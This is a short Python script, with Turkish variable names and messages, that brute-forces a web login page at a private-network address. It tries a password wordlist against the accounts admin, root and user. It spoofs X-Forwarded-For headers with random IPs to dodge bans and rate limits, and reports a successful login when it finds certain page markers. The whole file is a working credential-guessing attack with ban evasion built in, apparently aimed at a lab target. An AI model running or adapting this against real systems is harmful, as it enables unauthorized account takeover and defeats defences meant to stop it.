import requests
import time
import os
import random

USER_LIST = ["admin", "root", "user"]
WORDLIST = "gercek_sifreler.txt"
TARGET = "http://172.20.10.14:3000/login"

def sahte_ip_uret():
    return f"172.20.10.{random.randint(50, 250)}"

def saldiriyi_baslat(url):
    try:
        with open(WORDLIST, "r") as f:
            sifreler = [s.strip() for s in f.readlines()]
    except:
        print(f"[!] {WORDLIST} bulunamadı!")
        return

    for kullanici in USER_LIST:
        print(f"\n" + "="*40 + f"\n👤 HEDEF KULLANICI: {kullanici}\n" + "="*40)
        guncel_ip = sahte_ip_uret()
        
        index = 0
        while index < len(sifreler):
            sifre = sifreler[index]
            print(f"[?] [{guncel_ip}] {kullanici}:{sifre} deneniyor...", end="", flush=True)
            
            try:
                headers = {'X-Forwarded-For': guncel_ip}
                start_time = time.time()
                cevap = requests.post(url, data={'user': kullanici, 'pass': sifre}, headers=headers, timeout=20)
                gecikme = time.time() - start_time

                if "BANLANDI" in cevap.text or cevap.status_code == 403:
                    print(f" -> 🚫 BAN! IP değiştiriliyor...")
                    guncel_ip = sahte_ip_uret()
                    continue

                if "socket.io" in cevap.text or "id=\"n\"" in cevap.text or "id=\"o\"" in cevap.text:
                    print(f"\n\n🎉 [SİSTEME GİRİLDİ] Şifre Bulundu: {kullanici}:{sifre}")
                    print(f"⏱️ Yanıt Süresi: {gecikme:.2f} saniye.")
                    return 

                if gecikme > 9:
                    print(f" -> ❌ Reddedildi (Zift Tuzağı: {gecikme:.1f}sn beklendi)")
                else:
                    print(" -> ❌ Reddedildi.")
                
                index += 1

            except Exception as e:
                print(f" -> ⏳ Zaman aşımı! IP banlanmış veya sunucu aşırı yavaş.")
                guncel_ip = sahte_ip_uret()
                index += 1

saldiriyi_baslat(TARGET)
